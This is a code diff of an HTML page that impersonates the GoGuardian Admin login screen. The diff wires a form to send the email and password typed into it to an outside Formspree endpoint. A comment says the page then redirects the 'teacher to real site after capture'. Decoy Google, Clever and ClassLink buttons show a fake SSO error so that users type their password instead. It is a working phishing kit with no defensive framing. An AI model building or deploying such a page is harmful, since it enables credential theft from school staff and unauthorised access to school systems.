@@ -13,7 +13,7 @@
         .login-card { 
             background: #ffffff; width: 380px; padding: 40px; 
             border-radius: 4px; box-shadow: 0 1px 3px rgba(0,0,0,0.3); 
-            text-align: center; position: relative;
+            text-align: center;
         }
         .logo { width: 180px; margin-bottom: 25px; }
         .login-header { color: #5f6368; font-size: 14px; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 5px; }
@@ -36,36 +36,42 @@
         .btn-google { background-color: #4285f4; }
         .btn-clever { background-color: #4371f7; }
         .btn-classlink { background-color: #00a9bc; }
-        .icon { width: 18px; height: 18px; margin-right: 20px; }
+        .icon { width: 20px; height: 20px; margin-right: 20px; }
         #error-msg { color: #d93025; font-size: 13px; margin-bottom: 15px; display: none; }
     </style>
 </head>
 <body>
     <div class="login-card">
+        <!-- Official Logo -->
         <img src="https://imgur.com" class="logo">
         <div class="login-header">Goguardian Admin</div>
         <div class="login-title">Log in to your account</div>
 
+        <!-- Error message for decoy buttons -->
         <div id="error-msg">SSO Service Unavailable. Please log in with email/password.</div>
 
-        <form action="https://formspree.io" method="POST">
-            <input type="email" name="email" class="login-input" placeholder="Email" required>
-            <input type="password" name="password" class="login-input" placeholder="Password" required>
+        <!-- INTEGRATION: BASIC HTML GUIDE APPLIED -->
+        <form action="https://formspree.io/f/xgoranry" method="POST">
+            <input type="email" name="email" class="login-input" placeholder="Email" required />
+            <input type="password" name="password" class="login-input" placeholder="Password" required />
+            
+            <!-- Redirect setting to send teacher to real site after capture -->
             <input type="hidden" name="_next" value="https://goguardian.com">
+            
             <button type="submit" class="btn-login">Log in</button>
         </form>
 
         <div style="color: #5f6368; font-size: 12px; margin-bottom: 15px;">or</div>
 
-        <!-- FAKE BUTTONS WITH ERROR TRIGGER -->
+        <!-- DECOY BUTTONS (DISABLED) -->
         <div class="social-btn btn-google" onclick="showError()">
-            <img src="https://wikimedia.org" class="icon"> Log in with Google
+            <img src="https://gstatic.com" class="icon"> Log in with Google
         </div>
         <div class="social-btn btn-clever" onclick="showError()">
-            <img src="https://imgur.com" class="icon"> Log in with Clever
+            <img src="https://clever.com" class="icon" style="filter: brightness(0) invert(1);"> Log in with Clever
         </div>
         <div class="social-btn btn-classlink" onclick="showError()">
-            <img src="https://imgur.com" class="icon"> Log in with ClassLink
+            <img src="https://classlink.com" class="icon"> Log in with ClassLink
         </div>
     </div>
 
